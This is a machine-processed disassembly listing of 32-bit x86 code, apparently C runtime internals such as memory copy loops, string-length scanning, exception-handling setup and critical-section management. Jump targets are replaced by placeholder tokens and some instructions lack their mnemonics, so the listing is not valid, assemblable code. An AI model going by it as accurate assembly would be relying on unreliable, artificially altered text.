mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_425494 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4252f8 ]
mov al [ esi ]
mov [ edi ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
test esi 0x3
jne r-xdata
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_425494 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_425494 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_425494 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4252f8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4252f8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4252f8 ]
bt edi 0x2
jae r-xdata
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
lea esp [ esp ]
nop
bt edi 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
test esi 0x7
je r-xdata
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
movdqa xmm1 [ esi - 0x8 ]
lea esi [ esi - 0x8 ]
lea ecx [ ecx ]
bt esi 0x3
jae r-xdata
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x8
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x8
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x8
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x8 ]
jmp r-xdata
movdqa xmm1 [ esi - 0x4 ]
lea esi [ esi - 0x4 ]
mov edi edi
movdqa xmm1 [ esi - 0xc ]
lea esi [ esi - 0xc ]
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
cmp ecx 0x10
jl r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x4
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x4
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x4
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x4 ]
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0xc
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0xc
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0xc
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0xc ]
jmp r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
bt ecx 0x2
jae r-xdata
movdqu xmm1 [ esi ]
sub ecx 0x10
lea esi [ esi + 0x10 ]
movdqa [ edi ] xmm1
lea edi [ edi + 0x10 ]
jmp r-xdata
lea ebx [ ebx ]
bt ecx 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
mov eax [ ecx * 4 + jump_table_4252f8 ]
jmp eax
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
sub_425610
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_42569b
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub esp 0x20
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov ecx [ ebp + 0x8 ]
pop edi
pop esi
test eax eax
je r-xdata
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
test [ eax ] 0x10
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov eax [ ecx ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0xc ] 0x1994000
sub_42570a
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_42573d
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_425773
push ebp
mov ebp esp
push esi
cld
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
xor ecx esi
call sub_421ed7
push 0x0
push esi
push [ esi + 0x14 ]
push [ esi + 0xc ]
push 0x0
push [ ebp + 0x10 ]
push [ esi + 0x10 ]
push [ ebp + 0x8 ]
call sub_4273dd
add esp 0x20
pop esi
pop ebp
retn
sub_4257a4
push ebp
mov ebp esp
push ecx
push ebx
cld
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
xor ecx [ ebp + 0xc ]
call sub_421ed7
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x18 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_4273dd
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x123
call sub_4258a6
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_425a2a
pop ebx
leave
retn
sub_425841
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
and [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x18 ]
xor eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x14 ] sub_425773
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_431060
mov ecx eax
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_4258a6
push ebp
mov ebp esp
sub esp 0x38
push ebx
cmp [ ebp + 0x8 ] 0x123
jne r-xdata
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x34 ] sub_4257a4
mov eax [ rw-data ]
lea ecx [ ebp - 0x38 ]
xor eax ecx
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x20 ] eax
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x18 ] 0x0
and [ ebp - 0x14 ] 0x0
mov [ ebp - 0x1c ] esp
mov [ ebp - 0x18 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x38 ] eax
lea eax [ ebp - 0x38 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
call sub_42f4f6
mov eax [ eax + 0x80 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ ebp - 0x8 ]
pop ecx
pop ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x38 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x38 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
pop ebx
leave
retn
mov eax [ ebp - 0x4 ]
sub_42597b
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
mov ecx [ eax + 0x10 ]
push esi
mov esi [ eax + 0xc ]
push edi
mov [ ebp - 0x8 ] ecx
mov edi esi
mov [ ebp - 0x4 ] esi
test ebx ebx
js r-xdata
mov eax [ ebp + 0x14 ]
inc esi
mov [ eax ] esi
mov eax [ ebp + 0x18 ]
mov [ eax ] edi
mov eax [ ebp + 0x8 ]
cmp edi [ eax + 0xc ]
ja r-xdata
mov edx [ ebp + 0x10 ]
call sub_42e150
cmp esi edi
jbe r-xdata
dec esi
mov eax esi
imul eax eax 0x14
cmp [ eax + ecx + 0x4 ] edx
jge r-xdata
call sub_42e150
imul esi esi 0x14
pop edi
lea eax [ ecx + esi ]
pop esi
pop ebx
leave
retn
cmp esi 0xffffffff
jne r-xdata
cmp edx [ eax + ecx + 0x8 ]
jle r-xdata
test ebx ebx
jns r-xdata
mov edi [ ebp - 0x4 ]
dec ebx
mov [ ebp - 0x4 ] esi
cmp esi 0xffffffff
jne r-xdata
sub_4259fa
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ebp [ ebp - 0x4 ]
mov esp [ ebx - 0x4 ]
jmp eax
sub_425a2a
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call [ RtlUnwind@IAT ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x8 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_425a7d
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] ecx
call sub_42f4f6
mov ecx [ eax + 0x98 ]
mov [ esi + 0x4 ] ecx
call sub_42f4f6
mov [ eax + 0x98 ] esi
mov eax esi
pop esi
pop ebp
retn
sub_425aa7
push ebp
mov ebp esp
push esi
call sub_42f4f6
mov esi [ ebp + 0x8 ]
cmp esi [ eax + 0x98 ]
jne r-xdata
call sub_42f4f6
mov ecx [ eax + 0x98 ]
jmp r-xdata
call sub_42f4f6
mov ecx [ esi + 0x4 ]
mov [ eax + 0x98 ] ecx
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
mov eax [ ecx + 0x4 ]
cmp esi eax
je r-xdata
pop esi
pop ebp
jmp sub_42e150
mov eax [ esi + 0x4 ]
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov ecx eax
pop esi
pop ebp
retn
sub_425af7
push ebp
mov ebp esp
call sub_42f4f6
mov eax [ eax + 0x98 ]
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
mov ecx [ ebp + 0x8 ]
xor eax eax
pop ebp
retn
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
cmp [ eax ] ecx
je r-xdata
sub_425b20
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4273dd
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_425b56
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi * 8 + rw-data ] 0x0
jne r-xdata
push [ esi * 8 + rw-data ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push esi
call sub_425bde
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_42350a
sub_425b8a
push esi
push edi
mov esi rw-data
mov edi esi
push ebx
add edi 0x8
cmp edi rw-data
jl r-xdata
cmp [ edi + 0x4 ] 0x1
je r-xdata
mov ebx [ edi ]
test ebx ebx
je r-xdata
pop ebx
push ebx
call [ DeleteCriticalSection@IAT ]
push ebx
call sub_422732
and [ edi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
pop edi
pop esi
retn
push [ esi ]
call [ DeleteCriticalSection@IAT ]
sub_425bde
push 0x8
push r--data
call sub_429ad0
cmp [ rw-data ] 0x0
jne r-xdata
mov edi [ ebp + 0x8 ]
cmp [ edi * 8 + rw-data ] 0x0
jne r-xdata
call sub_429cc5
push 0x1e
call sub_429d22
push 0xff
call sub_4234f4
xor eax eax
inc eax
push 0x18
call sub_4266f1
pop ecx
mov esi eax
test esi esi
jne r-xdata
push 0xa
call sub_425b56
pop ecx
and [ ebp - 0x4 ] 0x0
cmp [ edi * 8 + rw-data ] 0x0
jne r-xdata
call sub_427b11
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
push esi
call sub_422732
pop ecx
push 0xfa0
push esi
call [ InitializeCriticalSectionAndSpinCount@IAT ]
mov [ edi * 8 + rw-data ] esi
jmp r-xdata
call sub_429b15
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_425c7c
sub_425c85
push esi
push edi
mov esi rw-data
mov edi rw-data
add esi 0x8
cmp esi rw-data
jl r-xdata
mov [ esi ] edi
push 0xfa0
push [ esi ]
add edi 0x18
call [ InitializeCriticalSectionAndSpinCount@IAT ]
cmp [ esi + 0x4 ] 0x1
jne r-xdata
xor eax eax
pop edi
inc eax
pop esi
retn
sub_425ccf
push 0x20
push r--data
call sub_429ad0
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov edi ebx
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
push edi
mov esi [ ebp + 0x8 ]
push esi
call sub_43003a
mov ebx eax
mov [ ebp + 0xc ] ebx
push edi
call sub_422732
add esp 0xc
test ebx ebx
je r-xdata
push 0x7fffffff
push esi
push ebx
push ebx
lea eax [ ebp - 0x1c ]
push eax
call sub_4312e7
add esp 0x14
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
call sub_42f4f6
mov [ ebp - 0x20 ] eax
mov ecx [ eax + 0x6c ]
mov [ ebp - 0x30 ] ecx
mov ecx [ eax + 0x68 ]
mov [ ebp - 0x2c ] ecx
xor edi edi
mov [ ebp - 0x1c ] edi
lea eax [ ebp - 0x30 ]
push eax
push edi
push ebx
push edi
push edi
lea eax [ ebp - 0x1c ]
push eax
call sub_43156a
add esp 0x18
test eax eax
je r-xdata
push 0x2
push [ ebp - 0x1c ]
call sub_4266a7
pop ecx
pop ecx
mov edi eax
test edi edi
jne r-xdata
cmp eax 0x16
je r-xdata
call sub_429b15
retn
mov eax [ ebp - 0x1c ]
add eax 0x4
push eax
call sub_4266f1
pop ecx
mov edi eax
mov [ ebp - 0x24 ] edi
test edi edi
je r-xdata
cmp eax 0x16
je r-xdata
push 0xffffffff
push esi
push [ ebp - 0x1c ]
push edi
push ebx
call sub_4312e7
add esp 0x14
test eax eax
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
cmp eax 0x22
jne r-xdata
lea ebx [ edi + 0x4 ]
mov [ ebp - 0x28 ] ebx
lea eax [ ebp - 0x30 ]
push eax
push 0xffffffff
push [ ebp + 0xc ]
push [ ebp - 0x1c ]
push ebx
push 0x0
call sub_43156a
add esp 0x18
test eax eax
je r-xdata
push edi
push edi
push edi
push edi
push edi
jmp r-xdata
cmp eax 0x22
jne r-xdata
cmp eax 0x16
je r-xdata
mov edi [ ebp - 0x30 ]
push 0xc
call sub_425b56
pop ecx
and [ ebp - 0x4 ] 0x0
add esi esi
mov eax [ edi + esi * 8 + 0x18 ]
test eax eax
je r-xdata
cmp eax 0x16
je r-xdata
call sub_42a241
test eax eax
jne r-xdata
cmp eax 0x22
je r-xdata
mov eax [ ebp - 0x20 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
jmp r-xdata
cmp eax 0x22
jne r-xdata
test eax eax
je r-xdata
mov eax [ edi ]
mov ecx [ ebp - 0x24 ]
mov [ ecx ] eax
mov [ edi + esi * 8 + 0x18 ] ecx
mov [ edi + esi * 8 + 0x10 ] ebx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_425e9e
mov eax ebx
test [ rw-data ] 0x1
jne r-xdata
push [ edi + esi * 8 + 0x18 ]
call sub_422732
pop ecx
test eax eax
jne r-xdata
push edi
call sub_422732
pop ecx
jmp r-xdata
mov eax [ edi + esi * 8 + 0x18 ]
test eax eax
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
push [ edi + esi * 8 + 0x18 ]
call sub_422732
pop ecx
sub_425ed0
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_4247f2
mov ecx [ ebp - 0x10 ]
cmp [ ecx + 0x74 ] 0x1
jle r-xdata
mov ecx [ ecx + 0x90 ]
mov eax [ ebp + 0x8 ]
movzx ecx [ ecx + eax * 2 ]
and ecx 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_431633
add esp 0xc
mov ecx eax
jmp r-xdata
mov eax ecx
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_425f20
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_4247f2
mov ecx [ ebp - 0x10 ]
cmp [ ecx + 0x74 ] 0x1
jle r-xdata
mov ecx [ ecx + 0x90 ]
mov eax [ ebp + 0x8 ]
movzx ecx [ ecx + eax * 2 ]
and ecx 0x2
lea eax [ ebp - 0x10 ]
push eax
push 0x2
push [ ebp + 0x8 ]
call sub_431633
add esp 0xc
mov ecx eax
jmp r-xdata
mov eax ecx
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_425f70
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_4247f2
mov ecx [ ebp - 0x10 ]
cmp [ ecx + 0x74 ] 0x1
jle r-xdata
mov ecx [ ecx + 0x90 ]
mov eax [ ebp + 0x8 ]
movzx ecx [ ecx + eax * 2 ]
and ecx 0x1
lea eax [ ebp - 0x10 ]
push eax
push 0x1
push [ ebp + 0x8 ]
call sub_431633
add esp 0xc
mov ecx eax
jmp r-xdata
mov eax ecx
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_425fc0
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_425ed0
pop ecx
pop ecx
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
pop ebp
retn
sub_425feb
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_425f20
pop ecx
pop ecx
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
and eax 0x2
pop ebp
retn
sub_426016
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_425f70
pop ecx
pop ecx
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
and eax 0x1
pop ebp
retn
sub_426041
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push ebx
push edi
push [ ebp + 0x8 ]
call sub_427b65
lea edi [ eax + 0x1 ]
push 0x2
push edi
call sub_4316e2
mov ebx eax
add esp 0xc
test ebx ebx
je r-xdata
xor eax eax
pop ebp
retn
xor eax eax
push [ ebp + 0x8 ]
push edi
push ebx
call sub_422868
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_42a241
int3
mov eax ebx
jmp r-xdata
pop edi
pop ebx
pop ebp
retn
sub_4260e2
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x2c ] ebx
mov eax [ esi + 0xa8 ]
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x44 ] esi
mov [ ebp - 0x40 ] ebx
test eax eax
je r-xdata
mov eax [ esi + 0x88 ]
test eax eax
je r-xdata
push edi
lea edi [ esi + 0x4 ]
cmp [ edi ] ebx
jne r-xdata
mov [ esi + 0x88 ] ebx
mov [ esi + 0x8c ] ebx
mov [ esi + 0x90 ] r--data
mov [ esi + 0x94 ] r--data
mov [ esi + 0x98 ] r--data
mov [ esi + 0x74 ] 0x1
xor eax eax
push eax
call [ InterlockedDecrement@IAT ]
push 0x4
call sub_4266f1
push 0x2
push 0x180
mov [ ebp - 0x2c ] eax
call sub_4266a7
push 0x1
push 0x180
mov [ ebp - 0x20 ] eax
call sub_4266a7
push 0x1
push 0x180
mov [ ebp - 0x24 ] eax
call sub_4266a7
push 0x1
push 0x101
mov [ ebp - 0x1c ] eax
call sub_4266a7
mov ecx eax
mov eax [ ebp - 0x2c ]
add esp 0x24
mov [ ebp - 0x28 ] ecx
test eax eax
je r-xdata
push edi
push 0x1004
push eax
lea eax [ ebp - 0x44 ]
push ebx
push eax
call sub_429edd
add esp 0x14
test eax eax
jne r-xdata
push [ ebp - 0x2c ]
call sub_422732
push [ ebp - 0x20 ]
call sub_422732
push [ ebp - 0x24 ]
call sub_422732
push [ ebp - 0x1c ]
call sub_422732
xor ebx ebx
add esp 0x10
inc ebx
cmp [ ebp - 0x20 ] ebx
je r-xdata
